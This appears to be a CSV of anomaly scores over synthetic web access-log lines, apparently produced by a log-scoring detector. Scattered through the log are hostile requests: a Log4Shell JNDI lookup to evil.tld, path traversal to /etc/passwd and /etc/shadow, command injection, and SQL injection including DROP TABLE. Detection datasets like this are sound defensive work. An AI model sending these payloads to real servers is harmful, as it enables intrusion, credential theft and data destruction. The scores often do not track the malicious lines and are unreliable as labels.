score_content,score_session,score_fused,score_fused_norm,line
71.8750228881836,,71.8750228881836,71.8750228881836,64.67.111.100 - - [10/Jan/2025:12:26:56 +0000] "OPTIONS /contact HTTP/1.1" 200 2654 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
71.81397247314453,,71.81397247314453,71.81397247314453,38.152.19.14 - - [10/Jan/2025:12:26:56 +0000] "OPTIONS /dashboard HTTP/1.1" 200 4613 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.9387025833129883,,2.9387025833129883,2.9387025833129883,165.91.159.52 - - [10/Jan/2025:12:26:56 +0000] "POST /.git/config HTTP/1.1" 200 14213 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
0.2869604229927063,,0.2869604229927063,0.2869604229927063,235.23.44.111 - - [10/Jan/2025:12:26:58 +0000] "GET /wp-login.php HTTP/1.1" 200 2918 "https://www.google.com/" "sqlmap/1.7.2#stable"
72.00360107421875,,72.00360107421875,72.00360107421875,215.230.229.174 - - [10/Jan/2025:12:27:01 +0000] "OPTIONS /login HTTP/1.1" 200 18105 "https://news.ycombinator.com/" "curl/7.85.0"
68.52972412109375,,68.52972412109375,68.52972412109375,99.39.75.6 - - [10/Jan/2025:12:27:02 +0000] "HEAD /search?q=camera HTTP/1.1" 200 4516 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
44.756072998046875,,44.756072998046875,44.756072998046875,7.147.19.88 - - [10/Jan/2025:12:27:02 +0000] "HEAD /../../etc/passwd HTTP/1.1" 200 3847 "-" "nikto/2.5.0"
26.86732292175293,,26.86732292175293,26.86732292175293,146.173.34.73 - - [10/Jan/2025:12:27:05 +0000] "DELETE /logout HTTP/1.1" 200 257 "https://twitter.com/" "sqlmap/1.7.2#stable"
30128.125,,30128.125,30128.125,42.147.24.52 - - [10/Jan/2025:12:27:07 +0000] "POST /about HTTP/1.1" 401 1444 "-" "nikto/2.5.0"
71.95134735107422,,71.95134735107422,71.95134735107422,158.208.180.111 - - [10/Jan/2025:12:27:10 +0000] "OPTIONS /logout HTTP/1.1" 200 13396 "https://twitter.com/" "curl/7.85.0"
124.94426727294922,,124.94426727294922,124.94426727294922,32.176.72.212 - - [10/Jan/2025:12:27:11 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 3156 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
30125.82421875,,30125.82421875,30125.82421875,170.113.217.94 - - [10/Jan/2025:12:27:14 +0000] "GET /login HTTP/1.1" 403 793 "https://www.google.com/" "curl/7.85.0"
2.2581377029418945,,2.2581377029418945,2.2581377029418945,197.44.5.3 - - [10/Jan/2025:12:27:17 +0000] "GET / HTTP/1.1" 200 406 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
24.078096389770508,,24.078096389770508,24.078096389770508,240.22.54.176 - - [10/Jan/2025:12:27:17 +0000] "GET /api/product?id=123 HTTP/1.1" 200 18886 "https://news.ycombinator.com/" "python-requests/2.31.0"
26.662029266357422,,26.662029266357422,26.662029266357422,140.207.88.61 - - [10/Jan/2025:12:27:20 +0000] "POST /api/product?id=123 HTTP/1.1" 200 19964 "https://example.com/" "dirb/2.22"
71.90213775634766,,71.90213775634766,71.90213775634766,177.114.243.58 - - [10/Jan/2025:12:27:20 +0000] "OPTIONS /profile HTTP/1.1" 200 9712 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30194.7734375,,30194.7734375,30194.7734375,19.132.170.88 - - [10/Jan/2025:12:27:22 +0000] "OPTIONS /profile HTTP/1.1" 403 395 "https://twitter.com/" "python-requests/2.31.0"
26.889741897583008,,26.889741897583008,26.889741897583008,18.93.62.212 - - [10/Jan/2025:12:27:22 +0000] "DELETE /about HTTP/1.1" 200 10762 "-" "Wget/1.21.2 (linux-gnu)"
51.46207046508789,,51.46207046508789,51.46207046508789,217.220.155.165 - - [10/Jan/2025:12:27:24 +0000] "DELETE /search?q=phone HTTP/1.1" 301 8018 "https://example.com/" "curl/7.85.0"
11059.904296875,,11059.904296875,11059.904296875,215.99.127.52 - - [10/Jan/2025:12:27:24 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 502 745 "-" "sqlmap/1.7.2#stable"
12.888398170471191,,12.888398170471191,12.888398170471191,94.115.134.171 - - [10/Jan/2025:12:27:27 +0000] "PUT /admin HTTP/1.1" 200 6896 "https://www.google.com/" "python-requests/2.31.0"
68.53907012939453,,68.53907012939453,68.53907012939453,89.237.48.16 - - [10/Jan/2025:12:27:27 +0000] "HEAD /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 945 "https://example.com/" "curl/7.85.0"
71.99884796142578,,71.99884796142578,71.99884796142578,149.160.32.178 - - [10/Jan/2025:12:27:28 +0000] "OPTIONS /admin HTTP/1.1" 200 16439 "https://www.google.com/" "curl/7.85.0"
93.90332794189453,,93.90332794189453,93.90332794189453,61.41.158.200 - - [10/Jan/2025:12:27:30 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 900 "https://twitter.com/" "sqlmap/1.7.2#stable"
49.06760025024414,,49.06760025024414,49.06760025024414,187.206.65.103 - - [10/Jan/2025:12:27:30 +0000] "HEAD /dashboard HTTP/1.1" 302 17780 "https://example.com/" "dirb/2.22"
26.66545867919922,,26.66545867919922,26.66545867919922,94.80.225.83 - - [10/Jan/2025:12:27:30 +0000] "POST /search?q=phone HTTP/1.1" 200 18387 "https://news.ycombinator.com/" "dirb/2.22"
48.87454605102539,,48.87454605102539,48.87454605102539,173.68.116.25 - - [10/Jan/2025:12:27:33 +0000] "DELETE /search?q=router HTTP/1.1" 200 10895 "-" "sqlmap/1.7.2#stable"
7.146732807159424,,7.146732807159424,7.146732807159424,93.81.57.174 - - [10/Jan/2025:12:27:33 +0000] "POST /profile HTTP/1.1" 301 9849 "https://www.google.com/" "dirb/2.22"
3.031708002090454,,3.031708002090454,3.031708002090454,192.99.67.3 - - [10/Jan/2025:12:27:34 +0000] "GET /index.html HTTP/1.1" 302 16722 "https://twitter.com/" "python-requests/2.31.0"
71.83415985107422,,71.83415985107422,71.83415985107422,61.179.47.135 - - [10/Jan/2025:12:27:36 +0000] "OPTIONS /dashboard HTTP/1.1" 200 9669 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
125.04243469238281,,125.04243469238281,125.04243469238281,224.141.132.127 - - [10/Jan/2025:12:27:36 +0000] "TRACE /search?q=router HTTP/1.1" 200 8808 "https://news.ycombinator.com/" "nikto/2.5.0"
30194.83203125,,30194.83203125,30194.83203125,21.81.170.182 - - [10/Jan/2025:12:27:39 +0000] "OPTIONS /about HTTP/1.1" 401 135 "-" "python-requests/2.31.0"
30124.037109375,,30124.037109375,30124.037109375,196.168.139.230 - - [10/Jan/2025:12:27:41 +0000] "GET /assets/app.css HTTP/1.1" 400 750 "https://www.google.com/" "nikto/2.5.0"
11038.6181640625,,11038.6181640625,11038.6181640625,246.4.166.7 - - [10/Jan/2025:12:27:44 +0000] "GET / HTTP/1.1" 503 192 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
71.99608612060547,,71.99608612060547,71.99608612060547,43.12.32.25 - - [10/Jan/2025:12:27:45 +0000] "OPTIONS /login HTTP/1.1" 200 15512 "https://example.com/" "sqlmap/1.7.2#stable"
72.00421142578125,,72.00421142578125,72.00421142578125,140.181.141.211 - - [10/Jan/2025:12:27:46 +0000] "OPTIONS /about HTTP/1.1" 200 18323 "https://news.ycombinator.com/" "python-requests/2.31.0"
48.80002212524414,,48.80002212524414,48.80002212524414,35.21.207.14 - - [10/Jan/2025:12:27:49 +0000] "DELETE /search?q=headphones HTTP/1.1" 200 11880 "https://example.com/" "curl/7.85.0"
34.97276306152344,,34.97276306152344,34.97276306152344,136.44.62.134 - - [10/Jan/2025:12:27:52 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 204 11033 "https://twitter.com/" "curl/7.85.0"
48.84596252441406,,48.84596252441406,48.84596252441406,254.248.136.205 - - [10/Jan/2025:12:27:53 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 988 "https://twitter.com/" "python-requests/2.31.0"
30191.3125,,30191.3125,30191.3125,239.136.127.133 - - [10/Jan/2025:12:27:54 +0000] "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 404 918 "https://example.com/" "python-requests/2.31.0"
34.91439437866211,,34.91439437866211,34.91439437866211,108.183.87.61 - - [10/Jan/2025:12:27:57 +0000] "PUT /api/product?id=123 HTTP/1.1" 200 11062 "https://news.ycombinator.com/" "python-requests/2.31.0"
4.579532146453857,,4.579532146453857,4.579532146453857,206.163.117.10 - - [10/Jan/2025:12:27:58 +0000] "GET /api/products HTTP/1.1" 304 240 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
68.63371276855469,,68.63371276855469,68.63371276855469,142.97.5.152 - - [10/Jan/2025:12:28:00 +0000] "HEAD /search?q=ssd HTTP/1.1" 204 14620 "https://news.ycombinator.com/" "nikto/2.5.0"
103.0145263671875,,103.0145263671875,103.0145263671875,196.214.252.141 - - [10/Jan/2025:12:28:02 +0000] "TRACE /profile HTTP/1.1" 200 12787 "-" "sqlmap/1.7.2#stable"
0.18453073501586914,,0.18453073501586914,0.18453073501586914,197.122.148.134 - - [10/Jan/2025:12:28:04 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 204 1328 "https://twitter.com/" "dirb/2.22"
1.8766453266143799,,1.8766453266143799,1.8766453266143799,145.221.177.95 - - [10/Jan/2025:12:28:06 +0000] "GET /dashboard HTTP/1.1" 200 929 "https://twitter.com/" "sqlmap/1.7.2#stable"
24.02349853515625,,24.02349853515625,24.02349853515625,176.240.3.100 - - [10/Jan/2025:12:28:07 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 686 "https://example.com/" "python-requests/2.31.0"
0.28823551535606384,,0.28823551535606384,0.28823551535606384,48.6.96.46 - - [10/Jan/2025:12:28:08 +0000] "GET /assets/app.js HTTP/1.1" 200 9592 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
12.833698272705078,,12.833698272705078,12.833698272705078,219.139.68.67 - - [10/Jan/2025:12:28:09 +0000] "PUT /contact HTTP/1.1" 200 12187 "https://twitter.com/" "python-requests/2.31.0"
30128.130859375,,30128.130859375,30128.130859375,90.250.32.160 - - [10/Jan/2025:12:28:10 +0000] "POST /contact HTTP/1.1" 403 1486 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30216.3125,,30216.3125,30216.3125,182.163.192.191 - - [10/Jan/2025:12:28:13 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 403 1117 "https://twitter.com/" "curl/7.85.0"
26.63605308532715,,26.63605308532715,26.63605308532715,229.114.48.118 - - [10/Jan/2025:12:28:15 +0000] "POST /search?q=phone HTTP/1.1" 200 9458 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.8817951679229736,,2.8817951679229736,2.8817951679229736,213.58.244.42 - - [10/Jan/2025:12:28:16 +0000] "POST /wp-login.php HTTP/1.1" 200 573 "https://www.google.com/" "curl/7.85.0"
11082.9599609375,,11082.9599609375,11082.9599609375,67.46.82.247 - - [10/Jan/2025:12:28:19 +0000] "HEAD /dashboard HTTP/1.1" 503 1417 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11040.66796875,,11040.66796875,11040.66796875,1.213.7.30 - - [10/Jan/2025:12:28:19 +0000] "POST /api/products HTTP/1.1" 500 260 "https://twitter.com/" "dirb/2.22"
26.658763885498047,,26.658763885498047,26.658763885498047,29.244.248.119 - - [10/Jan/2025:12:28:19 +0000] "POST /search?q=ssd HTTP/1.1" 200 1997 "https://example.com/" "python-requests/2.31.0"
7.061984539031982,,7.061984539031982,7.061984539031982,14.103.67.235 - - [10/Jan/2025:12:28:22 +0000] "POST /dashboard HTTP/1.1" 301 5606 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
34.969947814941406,,34.969947814941406,34.969947814941406,196.64.22.135 - - [10/Jan/2025:12:28:22 +0000] "PUT /search?q=ssd HTTP/1.1" 200 9893 "https://twitter.com/" "sqlmap/1.7.2#stable"
125.05426788330078,,125.05426788330078,125.05426788330078,134.86.79.125 - - [10/Jan/2025:12:28:24 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 12157 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
48.8718147277832,,48.8718147277832,48.8718147277832,94.35.96.24 - - [10/Jan/2025:12:28:25 +0000] "DELETE /search?q=phone HTTP/1.1" 200 4496 "https://news.ycombinator.com/" "curl/7.85.0"
4.918681621551514,,4.918681621551514,4.918681621551514,234.51.38.92 - - [10/Jan/2025:12:28:26 +0000] "GET / HTTP/1.1" 304 7504 "https://twitter.com/" "dirb/2.22"
2.23942232131958,,2.23942232131958,2.23942232131958,177.42.225.26 - - [10/Jan/2025:12:28:26 +0000] "GET / HTTP/1.1" 200 4824 "-" "sqlmap/1.7.2#stable"
30194.7578125,,30194.7578125,30194.7578125,156.61.16.146 - - [10/Jan/2025:12:28:27 +0000] "OPTIONS /api/products HTTP/1.1" 403 135 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.8725080490112305,,2.8725080490112305,2.8725080490112305,229.129.36.228 - - [10/Jan/2025:12:28:29 +0000] "GET /assets/app.css HTTP/1.1" 301 8159 "https://twitter.com/" "sqlmap/1.7.2#stable"
26.628812789916992,,26.628812789916992,26.628812789916992,212.101.46.134 - - [10/Jan/2025:12:28:30 +0000] "POST /search?q=camera HTTP/1.1" 200 13939 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
72.73896026611328,,72.73896026611328,72.73896026611328,13.245.154.145 - - [10/Jan/2025:12:28:33 +0000] "OPTIONS /cgi-bin/test.cgi HTTP/1.1" 301 2307 "https://www.google.com/" "sqlmap/1.7.2#stable"
2.907548427581787,,2.907548427581787,2.907548427581787,1.24.46.38 - - [10/Jan/2025:12:28:35 +0000] "GET /assets/app.css HTTP/1.1" 302 12188 "https://example.com/" "nikto/2.5.0"
0.314869225025177,,0.314869225025177,0.314869225025177,231.90.73.98 - - [10/Jan/2025:12:28:36 +0000] "GET /assets/app.js HTTP/1.1" 200 17518 "https://example.com/" "dirb/2.22"
26.615293502807617,,26.615293502807617,26.615293502807617,27.28.103.110 - - [10/Jan/2025:12:28:37 +0000] "GET /api/product?id=123 HTTP/1.1" 301 1575 "https://www.google.com/" "dirb/2.22"
125.03337097167969,,125.03337097167969,125.03337097167969,130.235.168.18 - - [10/Jan/2025:12:28:39 +0000] "TRACE /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 5486 "-" "sqlmap/1.7.2#stable"
48.89909362792969,,48.89909362792969,48.89909362792969,53.176.117.162 - - [10/Jan/2025:12:28:41 +0000] "DELETE /search?q=camera HTTP/1.1" 200 18696 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
2.020420551300049,,2.020420551300049,2.020420551300049,85.32.24.110 - - [10/Jan/2025:12:28:44 +0000] "GET /logout HTTP/1.1" 200 14011 "https://news.ycombinator.com/" "curl/7.85.0"
7.253381729125977,,7.253381729125977,7.253381729125977,162.200.186.94 - - [10/Jan/2025:12:28:46 +0000] "POST /login HTTP/1.1" 304 2454 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
46.561195373535156,,46.561195373535156,46.561195373535156,131.252.101.106 - - [10/Jan/2025:12:28:49 +0000] "HEAD /admin HTTP/1.1" 200 4779 "https://news.ycombinator.com/" "nikto/2.5.0"
2.9347939491271973,,2.9347939491271973,2.9347939491271973,190.208.232.114 - - [10/Jan/2025:12:28:51 +0000] "GET /assets/app.js HTTP/1.1" 302 12875 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.4760050773620605,,4.4760050773620605,4.4760050773620605,242.157.6.202 - - [10/Jan/2025:12:28:52 +0000] "POST /phpmyadmin HTTP/1.1" 200 18272 "-" "curl/7.85.0"
71.83692169189453,,71.83692169189453,71.83692169189453,44.213.230.167 - - [10/Jan/2025:12:28:54 +0000] "OPTIONS /api/products HTTP/1.1" 204 16504 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9854599237442017,,1.9854599237442017,1.9854599237442017,172.48.99.105 - - [10/Jan/2025:12:28:56 +0000] "GET /logout HTTP/1.1" 200 751 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.5736808180809021,,0.5736808180809021,0.5736808180809021,79.179.212.145 - - [10/Jan/2025:12:28:59 +0000] "GET /.env HTTP/1.1" 200 6127 "-" "curl/7.85.0"
93.91812133789062,,93.91812133789062,93.91812133789062,251.150.122.184 - - [10/Jan/2025:12:29:02 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 3296 "-" "curl/7.85.0"
24.010337829589844,,24.010337829589844,24.010337829589844,222.120.156.112 - - [10/Jan/2025:12:29:03 +0000] "GET /search?q=router HTTP/1.1" 200 5370 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
103.05786895751953,,103.05786895751953,103.05786895751953,33.37.231.234 - - [10/Jan/2025:12:29:04 +0000] "TRACE /about HTTP/1.1" 200 4434 "https://www.google.com/" "python-requests/2.31.0"
71.89990997314453,,71.89990997314453,71.89990997314453,217.208.119.175 - - [10/Jan/2025:12:29:04 +0000] "OPTIONS /contact HTTP/1.1" 200 9117 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
34.97850036621094,,34.97850036621094,34.97850036621094,182.145.40.3 - - [10/Jan/2025:12:29:05 +0000] "PUT /search?q=ssd HTTP/1.1" 200 12279 "https://news.ycombinator.com/" "dirb/2.22"
71.23938751220703,,71.23938751220703,71.23938751220703,134.11.59.161 - - [10/Jan/2025:12:29:05 +0000] "HEAD /search?q=ssd HTTP/1.1" 302 13918 "https://news.ycombinator.com/" "nikto/2.5.0"
29.364227294921875,,29.364227294921875,29.364227294921875,207.246.203.39 - - [10/Jan/2025:12:29:08 +0000] "DELETE /api/products HTTP/1.1" 302 15219 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
93.9504623413086,,93.9504623413086,93.9504623413086,47.4.23.237 - - [10/Jan/2025:12:29:08 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 200 12039 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
68.61598205566406,,68.61598205566406,68.61598205566406,74.111.83.242 - - [10/Jan/2025:12:29:08 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 7486 "-" "Wget/1.21.2 (linux-gnu)"
24.060070037841797,,24.060070037841797,24.060070037841797,239.181.50.1 - - [10/Jan/2025:12:29:08 +0000] "GET /search?q=phone HTTP/1.1" 200 12094 "https://news.ycombinator.com/" "python-requests/2.31.0"
30147.41796875,,30147.41796875,30147.41796875,103.242.109.145 - - [10/Jan/2025:12:29:11 +0000] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 401 1293 "https://twitter.com/" "nikto/2.5.0"
2.9632461071014404,,2.9632461071014404,2.9632461071014404,203.140.35.109 - - [10/Jan/2025:12:29:13 +0000] "GET /assets/app.css HTTP/1.1" 304 16963 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
0.28059566020965576,,0.28059566020965576,0.28059566020965576,247.232.150.69 - - [10/Jan/2025:12:29:16 +0000] "GET /assets/app.css HTTP/1.1" 200 14467 "https://example.com/" "sqlmap/1.7.2#stable"
4.441906452178955,,4.441906452178955,4.441906452178955,222.103.42.79 - - [10/Jan/2025:12:29:19 +0000] "POST /api/products HTTP/1.1" 200 1089 "https://example.com/" "python-requests/2.31.0"
2.996631622314453,,2.996631622314453,2.996631622314453,235.78.159.128 - - [10/Jan/2025:12:29:20 +0000] "GET /assets/app.js HTTP/1.1" 304 19977 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
101.41535186767578,,101.41535186767578,101.41535186767578,104.64.113.158 - - [10/Jan/2025:12:29:23 +0000] "TRACE /.git/config HTTP/1.1" 200 11267 "https://twitter.com/" "sqlmap/1.7.2#stable"
34.86539840698242,,34.86539840698242,34.86539840698242,24.132.120.119 - - [10/Jan/2025:12:29:24 +0000] "PUT /search?q=router HTTP/1.1" 200 2335 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.2292199283838272,,0.2292199283838272,0.2292199283838272,196.35.48.254 - - [10/Jan/2025:12:29:27 +0000] "GET /../../etc/passwd HTTP/1.1" 201 13006 "https://www.google.com/" "dirb/2.22"
29.44334602355957,,29.44334602355957,29.44334602355957,57.112.231.252 - - [10/Jan/2025:12:29:29 +0000] "DELETE /profile HTTP/1.1" 302 14933 "https://news.ycombinator.com/" "curl/7.85.0"
37.55979537963867,,37.55979537963867,37.55979537963867,75.144.124.22 - - [10/Jan/2025:12:29:29 +0000] "PUT /api/user?id=1;DROP TABLE users HTTP/1.1" 304 14085 "https://news.ycombinator.com/" "curl/7.85.0"
12.886163711547852,,12.886163711547852,12.886163711547852,106.178.201.205 - - [10/Jan/2025:12:29:29 +0000] "PUT /login HTTP/1.1" 200 6365 "https://example.com/" "curl/7.85.0"
4.547062397003174,,4.547062397003174,4.547062397003174,36.254.182.156 - - [10/Jan/2025:12:29:30 +0000] "POST /contact HTTP/1.1" 200 9514 "https://news.ycombinator.com/" "nikto/2.5.0"
46.53218460083008,,46.53218460083008,46.53218460083008,18.82.85.177 - - [10/Jan/2025:12:29:31 +0000] "HEAD /logout HTTP/1.1" 200 6979 "https://twitter.com/" "sqlmap/1.7.2#stable"
26.86212730407715,,26.86212730407715,26.86212730407715,15.146.106.161 - - [10/Jan/2025:12:29:32 +0000] "DELETE /login HTTP/1.1" 204 5387 "https://example.com/" "curl/7.85.0"
5.489799499511719,,5.489799499511719,5.489799499511719,97.139.36.128 - - [10/Jan/2025:12:29:32 +0000] "POST /cgi-bin/test.cgi HTTP/1.1" 304 15579 "https://example.com/" "nikto/2.5.0"
2.0178415775299072,,2.0178415775299072,2.0178415775299072,111.192.52.101 - - [10/Jan/2025:12:29:32 +0000] "GET /logout HTTP/1.1" 200 13233 "-" "python-requests/2.31.0"
48.826454162597656,,48.826454162597656,48.826454162597656,120.25.29.213 - - [10/Jan/2025:12:29:32 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 4434 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
93.90520477294922,,93.90520477294922,93.90520477294922,236.188.227.29 - - [10/Jan/2025:12:29:33 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 5596 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
46.51467514038086,,46.51467514038086,46.51467514038086,61.45.54.147 - - [10/Jan/2025:12:29:33 +0000] "HEAD /logout HTTP/1.1" 200 1813 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
29.499534606933594,,29.499534606933594,29.499534606933594,217.102.33.71 - - [10/Jan/2025:12:29:33 +0000] "DELETE /login HTTP/1.1" 301 15365 "https://example.com/" "sqlmap/1.7.2#stable"
4.951278209686279,,4.951278209686279,4.951278209686279,45.224.185.247 - - [10/Jan/2025:12:29:36 +0000] "GET / HTTP/1.1" 304 16920 "https://example.com/" "python-requests/2.31.0"
24.05335807800293,,24.05335807800293,24.05335807800293,196.27.251.128 - - [10/Jan/2025:12:29:38 +0000] "GET /search?q=phone HTTP/1.1" 200 10234 "https://example.com/" "sqlmap/1.7.2#stable"
0.5941833853721619,,0.5941833853721619,0.5941833853721619,236.16.65.91 - - [10/Jan/2025:12:29:39 +0000] "GET /.env HTTP/1.1" 200 11230 "https://example.com/" "python-requests/2.31.0"
48.894737243652344,,48.894737243652344,48.894737243652344,24.38.7.173 - - [10/Jan/2025:12:29:42 +0000] "DELETE /search?q=camera HTTP/1.1" 200 17155 "https://twitter.com/" "python-requests/2.31.0"
2.2436132431030273,,2.2436132431030273,2.2436132431030273,200.100.26.214 - - [10/Jan/2025:12:29:45 +0000] "GET / HTTP/1.1" 200 5776 "-" "sqlmap/1.7.2#stable"
2.287825584411621,,2.287825584411621,2.287825584411621,70.155.80.238 - - [10/Jan/2025:12:29:47 +0000] "GET / HTTP/1.1" 200 18121 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
71.95623016357422,,71.95623016357422,71.95623016357422,31.131.243.81 - - [10/Jan/2025:12:29:47 +0000] "OPTIONS /about HTTP/1.1" 200 934 "https://example.com/" "python-requests/2.31.0"
30125.318359375,,30125.318359375,30125.318359375,188.157.227.229 - - [10/Jan/2025:12:29:47 +0000] "GET /assets/app.js HTTP/1.1" 429 437 "https://twitter.com/" "nikto/2.5.0"
0.27726510167121887,,0.27726510167121887,0.27726510167121887,237.112.104.250 - - [10/Jan/2025:12:29:49 +0000] "GET /assets/app.css HTTP/1.1" 200 13455 "https://news.ycombinator.com/" "nikto/2.5.0"
1.9841078519821167,,1.9841078519821167,1.9841078519821167,220.87.186.55 - - [10/Jan/2025:12:29:50 +0000] "GET /contact HTTP/1.1" 200 14093 "https://www.google.com/" "curl/7.85.0"
47.82513427734375,,47.82513427734375,47.82513427734375,26.103.4.115 - - [10/Jan/2025:12:29:52 +0000] "HEAD /.env HTTP/1.1" 304 18058 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
4.648151397705078,,4.648151397705078,4.648151397705078,129.106.139.180 - - [10/Jan/2025:12:29:55 +0000] "POST /login HTTP/1.1" 200 17351 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.608558654785156,,26.608558654785156,26.608558654785156,122.237.107.65 - - [10/Jan/2025:12:29:58 +0000] "POST /search?q=phone HTTP/1.1" 204 4484 "https://example.com/" "sqlmap/1.7.2#stable"
68.52812957763672,,68.52812957763672,68.52812957763672,107.22.55.80 - - [10/Jan/2025:12:30:01 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 9746 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
4.858757972717285,,4.858757972717285,4.858757972717285,31.210.38.239 - - [10/Jan/2025:12:30:01 +0000] "GET / HTTP/1.1" 302 1570 "https://www.google.com/" "curl/7.85.0"
